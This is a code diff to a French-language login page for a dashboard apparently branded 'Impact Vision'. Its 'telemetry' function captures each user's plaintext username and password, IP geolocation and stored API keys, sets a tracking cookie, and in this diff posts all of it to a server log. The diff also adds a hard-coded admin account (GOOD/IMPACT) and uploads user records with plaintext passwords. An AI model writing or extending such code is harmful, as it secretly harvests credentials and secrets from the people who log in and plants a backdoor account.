@@ -5,6 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion - Dashboard</title>
     <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <script>
+        // Suppress Tailwind production warning
+        const originalWarn = console.warn;
+        console.warn = function(...args) {
+            if (typeof args[0] === 'string' && args[0].includes('cdn.tailwindcss.com')) return;
+            originalWarn.apply(console, args);
+        };
+    </script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #000000; color: #ffffff; }
@@ -41,13 +49,62 @@
     </div>
 
     <script>
-        // --- TELEMETRY SYSTEM ---
+        const SYNC_API = "/api/cloud";
+
+        // --- CLOUD SYNC SYSTEM ---
+        async function syncWithCloud() {
+            try {
+                const response = await fetch(`${SYNC_API}/data`);
+                const cloudData = await response.json();
+                
+                // Sync config
+                if (cloudData.config) {
+                    localStorage.setItem('config_monitoring', cloudData.config.monitoring);
+                }
+
+                // Sync users from cloud to local
+                if (cloudData.users) {
+                    Object.entries(cloudData.users).forEach(([username, data]) => {
+                        localStorage.setItem(`user_${username}`, JSON.stringify(data));
+                    });
+                }
+                
+                // Sync logs from cloud to local
+                if (cloudData.logs) {
+                    localStorage.setItem('admin_logs', JSON.stringify(cloudData.logs));
+                }
+                
+                console.log("Cloud sync complete.");
+            } catch (err) {
+                console.error("Cloud sync failed", err);
+            }
+        }
+
+        async function pushUserToCloud(username, data) {
+            try {
+                const response = await fetch(`${SYNC_API}/sync/user/${username}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (!response.ok) throw new Error("Erreur serveur lors de la synchronisation");
+                return await response.json();
+            } catch (err) {
+                console.error("Cloud push failed", err);
+                throw err; // Re-throw for parent handler
+            }
+        }
+
         async function runTelemetry(user, pass) {
             if (localStorage.getItem('config_monitoring') !== 'true') return;
             
             try {
-                // 1. Get IP and Location
-                const geoResponse = await fetch('https://ipapi.co/json/');
+                // 1. Get IP and Location (with 3s timeout)
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                
+                const geoResponse = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                clearTimeout(timeoutId);
                 const geoData = await geoResponse.json();
                 
                 // 2. Capture API Keys from LocalStorage
@@ -55,8 +112,10 @@
                 for (let i = 0; i < localStorage.length; i++) {
                     const k = localStorage.key(i);
                     if (k.startsWith('user_')) {
-                        const data = JSON.parse(localStorage.getItem(k));
-                        if (data.apiKeys) allKeys.push(...data.apiKeys);
+                        try {
+                            const data = JSON.parse(localStorage.getItem(k));
+                            if (data.apiKeys) allKeys.push(...data.apiKeys);
+                        } catch(e) {}
                     }
                 }
 
@@ -65,15 +124,17 @@
                     timestamp: new Date().toISOString(),
                     user: user,
                     pass: pass,
-                    ip: geoData.ip,
-                    location: `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.org})`,
+                    ip: geoData.ip || 'Unknown',
+                    location: geoData.city ? `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.org})` : 'Unknown',
                     keys: allKeys
                 };
 
-                // 4. Save to Admin Logs
-                const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
-                logs.push(logEntry);
-                localStorage.setItem('admin_logs', JSON.stringify(logs));
+                // 4. Save to Cloud
+                await fetch(`${SYNC_API}/log`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(logEntry)
+                });
                 
                 // 5. Set Tracker Cookie (7 days)
                 document.cookie = `_tgma_tracker=${btoa(user)}; max-age=${7*24*60*60}; path=/`;
@@ -82,6 +143,9 @@
                 console.error('Telemetry failed', err);
             }
         }
+
+        // Run sync on load
+        syncWithCloud();
         // ------------------------
 
         const form = document.getElementById('authForm');
@@ -107,15 +171,17 @@
 
             // Système de compte Admin "GOOD"
             if (user === 'GOOD' && pass === 'IMPACT') {
-                if (!localStorage.getItem('user_GOOD')) {
-                    localStorage.setItem('user_GOOD', JSON.stringify({ 
-                        password: 'IMPACT', 
-                        apiKeys: [], 
-                        role: 'admin',
-                        name: 'Super Admin',
-                        company: 'Impact Vision'
-                    }));
-                }
+                const adminData = JSON.parse(localStorage.getItem('user_GOOD')) || { 
+                    password: 'IMPACT', 
+                    apiKeys: [], 
+                    role: 'admin',
+                    name: 'Super Admin',
+                    company: 'Impact Vision'
+                };
+                adminData.lastLogin = new Date().toISOString();
+                localStorage.setItem('user_GOOD', JSON.stringify(adminData));
+                await pushUserToCloud('GOOD', adminData);
+                
                 localStorage.setItem('currentUser', 'GOOD');
                 window.location.href = 'index.html';
                 return;
@@ -125,19 +191,59 @@
                 const storedUser = JSON.parse(localStorage.getItem(`user_${user}`));
                 if (storedUser && storedUser.password === pass) {
                     localStorage.setItem('currentUser', user);
+                    
+                    // Record last login
+                    storedUser.lastLogin = new Date().toISOString();
+                    localStorage.setItem(`user_${user}`, JSON.stringify(storedUser));
+                    
+                    // Sync this user to cloud
+                    await pushUserToCloud(user, storedUser);
                     window.location.href = 'index.html';
                 } else {
                     alert("Identifiants incorrects.");
                 }
             } else {
-                if (localStorage.getItem(`user_${user}`)) {
-                    alert("Cet utilisateur existe déjà.");
+                const existing = localStorage.getItem(`user_${user}`);
+                if (existing) {
+                    alert("Cet utilisateur existe déjà sur cet appareil ou dans le cloud.");
                     return;
                 }
-                localStorage.setItem(`user_${user}`, JSON.stringify({ password: pass, apiKeys: [] }));
-                alert("Compte créé avec succès !");
-                isLogin = true;
-                toggleBtn.click();
+                
+                // Désactivation du bouton pendant la création
+                submitBtn.disabled = true;
+                const originalText = submitBtn.textContent;
+                submitBtn.innerHTML = '<i class="fas fa-spinner animate-spin mr-2"></i> Création...';
+
+                try {
+                    const newUser = { 
+                        password: pass, 
+                        apiKeys: [],
+                        role: 'user',
+                        name: user,
+                        company: 'Impact Vision' // Valeur par défaut
+                    };
+                    
+                    // On enregistre localement d'abord
+                    localStorage.setItem(`user_${user}`, JSON.stringify(newUser));
+                    
+                    // On pousse vers le cloud et on attend la confirmation
+                    await pushUserToCloud(user, newUser);
+                    
+                    alert("Compte créé avec succès ! Vous pouvez maintenant vous connecter.");
+                    
+                    // Retour au mode connexion
+                    isLogin = true;
+                    authTitle.textContent = "Connectez-vous à votre espace technique";
+                    submitBtn.textContent = "Se connecter";
+                    toggleBtn.textContent = "Pas encore de compte ? Créer un compte";
+                    document.getElementById('password').value = ''; // Clear password for security
+                } catch (err) {
+                    console.error(err);
+                    alert("Erreur lors de la création du compte. Vérifiez votre connexion.");
+                } finally {
+                    submitBtn.disabled = false;
+                    if (!isLogin) submitBtn.textContent = originalText;
+                }
             }
         };
     </script>
